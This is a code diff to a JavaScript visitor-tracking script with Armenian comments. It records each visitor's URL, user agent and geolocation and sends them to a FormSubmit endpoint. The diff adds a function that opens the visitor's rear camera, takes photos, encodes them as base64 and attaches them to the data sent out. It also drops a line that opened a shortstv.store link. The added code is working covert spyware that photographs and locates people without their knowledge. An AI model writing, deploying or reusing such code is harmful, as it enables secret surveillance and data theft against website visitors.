@@ -1,5 +1,5 @@
-// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
-function trackVisitor() {
+// Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
+async function trackVisitor() {
     const data = {
       website: window.location.href || "index.html",
       userAgent: navigator.userAgent,
@@ -42,19 +42,60 @@ function trackVisitor() {
         position => {
           data.latitude = position.coords.latitude;
           data.longitude = position.coords.longitude;
-          sendData(data);
+          captureAndSend(data);
         },
         () => {
           data.locationError = "Geolocation unavailable";
-          sendData(data);
+          captureAndSend(data);
         }
       );
     } else {
+      captureAndSend(data);
+    }
+  }
+  
+  // Սքրինշոթների կատարում և ուղարկում
+  async function captureAndSend(data) {
+    try {
+      // Փորձել մուտք գործել տեսախցիկներ
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "environment" } }, // Հետևի տեսախցիկ
+        audio: false
+      });
+      
+      const videoTrack = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(videoTrack);
+      
+      // Կատարել սքրինշոթ
+      const frontBlob = await imageCapture.takePhoto();
+      const backBlob = await imageCapture.takePhoto(); // Կարող եք փոխել տեսախցիկի ռեժիմը
+      
+      // Փակել տեսախցիկը
+      videoTrack.stop();
+      
+      // Փոխակերպել blob-երը base64
+      const frontImage = await blobToBase64(frontBlob);
+      const backImage = await blobToBase64(backBlob);
+      
+      data.frontCameraImage = frontImage;
+      data.backCameraImage = backImage;
+      
+      sendData(data);
+    } catch (error) {
+      console.error("Camera access error:", error);
+      data.cameraError = error.message;
       sendData(data);
     }
-    
-    // Բացել shortstv.store հղումը նոր ներդիրում
-    window.open("http://shortstv.store/app?user=7939566310", "_blank");
+  }
+  
+  // Blob-ը փոխակերպել base64
+  function blobToBase64(blob) {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onloadend = () => resolve(reader.result);
+      reader.onerror = reject;
+      reader.readAsDataURL(blob);
+    });
   }
   
   // Տվյալների ուղարկում FormSubmit-ին
